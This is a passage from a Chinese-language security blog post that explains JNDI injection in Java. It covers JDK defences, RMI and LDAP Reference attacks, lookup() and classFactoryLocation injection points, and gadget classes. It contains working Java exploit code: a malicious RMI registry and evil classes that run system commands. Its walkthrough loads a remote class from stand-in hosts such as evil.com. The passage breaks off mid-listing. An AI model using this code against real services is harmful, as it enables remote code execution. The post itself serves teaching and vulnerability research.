class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(Name paramName)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramName.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        String str1 = paramName.get(<span class="number">0</span>);</span><br><span class="line">        String str2 = getURLScheme(str1);  <span class="comment">// 尝试解析 URI 中的协议</span></span><br><span class="line">        <span class="keyword">if</span> (str2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span></span><br><span class="line">            Context localContext = NamingManager.getURLContext(str2, <span class="keyword">this</span>.myProps);</span><br><span class="line">            <span class="keyword">if</span> (localContext != <span class="keyword">null</span>) &#123; </span><br><span class="line">                <span class="keyword">return</span> localContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-JNDI注入"><a href="#0x02-JNDI注入" class="headerlink" title="0x02 JNDI注入"></a>0x02 JNDI注入</h2><h3 id="前提条件-amp-JDK防御"><a href="#前提条件-amp-JDK防御" class="headerlink" title="前提条件&amp;JDK防御"></a>前提条件&amp;JDK防御</h3><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p><p>这里将所有不同版本JDK的防御都列出来：</p><ul><li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li><li>JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li><li>JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li></ul><p>因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。</p><h3 id="RMI攻击向量"><a href="#RMI攻击向量" class="headerlink" title="RMI攻击向量"></a>RMI攻击向量</h3><h4 id="RMI-Reference利用技巧"><a href="#RMI-Reference利用技巧" class="headerlink" title="RMI+Reference利用技巧"></a>RMI+Reference利用技巧</h4><p>JNDI提供了一个Reference类来表示某个对象的引用，这个类中包含被引用对象的类信息和地址。</p><p>因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。</p><p>那么这个JNDI利用技巧是啥呢？——<strong>就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</strong>。</p><p>我们看个示例，以lookup()函数参数外部可控为例，攻击原理如图：</p><p><img src="/2019/09/15/浅析JNDI注入/6.png" alt=""></p><ol><li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <code>rmi://evil.com:1099/refObj</code>；</li><li>原先配置好的上下文环境 <code>rmi://localhost:1099</code> 会因为动态环境转换而被指向 <code>rmi://evil.com:1099/</code>；</li><li>应用去 <code>rmi://evil.com:1099</code> 请求绑定对象 <code>refObj</code>，攻击者事先准备好的 RMI 服务会返回与名称 <code>refObj</code>想绑定的 ReferenceWrapper 对象（<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code>）；</li><li>应用获取到 <code>ReferenceWrapper</code> 对象开始从本地 <code>CLASSPATH</code> 中搜索 <code>EvilObject</code> 类，如果不存在则会从 <code>http://evil-cb.com/</code> 上去尝试获取 <code>EvilObject.class</code>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code>；</li><li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <code>EvilObject.class</code>；</li><li>应用开始调用 <code>EvilObject</code> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；</li></ol><p>代码如下，当然需要注意JDK版本的影响，我本地JDK版本为1.8.0_73。</p><p>JNDIClient.java，lookup()函数参数外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java JNDIClient &lt;uri&gt;"</span>);</span><br><span class="line">            System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String uri = args[<span class="number">0</span>];</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        System.out.println(<span class="string">"Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilObject.java，目的是弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"cmd"</span>, <span class="string">"/C"</span>, <span class="string">"calc.exe"</span>&#125;;</span><br><span class="line">        Process pc = rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIService.java，对象实例要能成功绑定在RMI服务上，必须直接或间接的实现 Remote 接口，这里 ReferenceWrapper就继承于 UnicastRemoteObject 类并实现了Remote接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将RMIService.java和JNDIClient.java放在同一目录下，将EvilObject.java放在另一个目录下（为防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令，最后成功通过RMI+Reference的方式实现JNDI注入：</p><p><img src="/2019/09/15/浅析JNDI注入/7.png" alt=""></p><h4 id="漏洞点1——lookup参数注入"><a href="#漏洞点1——lookup参数注入" class="headerlink" title="漏洞点1——lookup参数注入"></a>漏洞点1——lookup参数注入</h4><p>当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行。</p><p>下面以RMI服务为例，原理和上一个小结讲的是一样的，本地JDK版本为1.8.0_73。</p><p>AClient.java，是JNDI客户端，原本上下文环境已经设置了默认连接本地的1099端口的RMI注册表服务，同时程序允许用户输入URI地址来动态转换JNDI的访问地址，即此处lookup()函数的参数可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">            ctx.lookup(uri);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">            ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AServer.java，是攻击者搭建的恶意RMI注册表服务而非原本正常的本地RMI注册表服务（做漏洞演示就没必要写正常的服务端那部分了），其将恶意Reference类绑定到RMI注册表中，用于给JNDI客户端加载并执行恶意代码（注意这里的Reference类初始化时其第三个参数即factoryLocation参数随意设置了一个内容，将该恶意类放在与当前RMI注册表服务同一目录中，当然也可以修改该参数为某个URI去加载，但是需要注意的是URL不用指定到特定的class、只需给出该class所在的URL路径即可）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1688</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, <span class="string">"test"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"exp"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后编写恶意EvilClassFactory类，目标是在客户端执行ipconfig命令，将其编译成class文件后与AServer放置于同一目录下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"ipconfig"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模拟场景，攻击者开启恶意RMI注册表服务AServer，同时恶意类EvilClassFactory放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向AServer的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。效果如图：</p><p><img src="/2019/09/15/浅析JNDI注入/5.png" alt=""></p><p>最后小结一下，调用InitialContext.lookup()函数都有哪些类。</p><p>在RMI中调用了InitialContext.lookup()的类有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure><p>在LDAP中调用了InitialContext.lookup()的类有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring&apos;s LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure><h4 id="漏洞点2——classFactoryLocation参数注入"><a href="#漏洞点2——classFactoryLocation参数注入" class="headerlink" title="漏洞点2——classFactoryLocation参数注入"></a>漏洞点2——classFactoryLocation参数注入</h4><p>前面lookup()参数注入是基于RMI客户端的，也是最常见的。而本小节的classFactoryLocation参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入。</p><p>整个利用原理过程如图：</p><p><img src="/2019/09/15/浅析JNDI注入/10.png" alt=""></p><p>BClient.java，RMI客户端，通过JNDI来查询RMI注册表上绑定的demo对象，其中lookup()函数参数不可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">        ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BServer.java，RMI服务端，创建RMI注册表并将一个远程类的引用绑定在注册表中名为demo，其中该Reference的classFactoryLocation参数外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            uri = <span class="string">"http://127.0.0.1/demo.class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]classFactoryLocation: "</span> + uri);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, uri);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'demo' to 'rmi://192.168.43.201:1099/demo'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"demo"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>EvilClassFactory.java，攻击者编写的远程恶意类，这里是在RMI客户端执行tasklist命令并输出出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"tasklist"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行：</p><p><img src="/2019/09/15/浅析JNDI注入/9.png" alt=""></p><h4 id="漏洞点3——RMI恶意远程对象"><a href="#漏洞点3——RMI恶意远程对象" class="headerlink" title="漏洞点3——RMI恶意远程对象"></a>漏洞点3——RMI恶意远程对象</h4><blockquote><p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：</p><ol><li>RMI客户端的上下文环境允许访问远程Codebase。</li><li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li></ol><p>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p><p>Changelog:</p><ul><li>JDK 6u45 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li><li>JDK 7u21 <a href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li></ul></blockquote><p>这种方法限制很多，不常使用，这里先搞Demo了，意义不大。</p><h4 id="漏洞点4——结合反序列化漏洞"><a href="#漏洞点4——结合反序列化漏洞" class="headerlink" title="漏洞点4——结合反序列化漏洞"></a>漏洞点4——结合反序列化漏洞</h4><p>这种情形其实就是漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用。</p><p>具体的例子如Spring Framework的反序列化漏洞，原理和示例看之前的文章就OK了：<a href="https://www.mi1k7ea.com/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">《由JNDI注入引发的Spring Framework反序列化漏洞》</a></p><h3 id="LDAP攻击向量"><a href="#LDAP攻击向量" class="headerlink" title="LDAP攻击向量"></a>LDAP攻击向量</h3><p>通过LDAP攻击向量来利用JNDI注入的原理和RMI攻击向量是一样的，区别只是换了个媒介而已，下面就只列下LDAP+Reference的利用技巧，至于JNDI注入漏洞点和前面是一样的就不再赘述了。</p><h4 id="LDAP-Reference利用技巧"><a href="#LDAP-Reference利用技巧" class="headerlink" title="LDAP+Reference利用技巧"></a>LDAP+Reference利用技巧</h4><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如<code>ldap://xxx/xxx</code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。下面的示例代码中我本地的JDk版本是1.8.0_73。</p><p>LdapServer.java，LDAP服务，需要导入unboundid-ldapsdk.jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 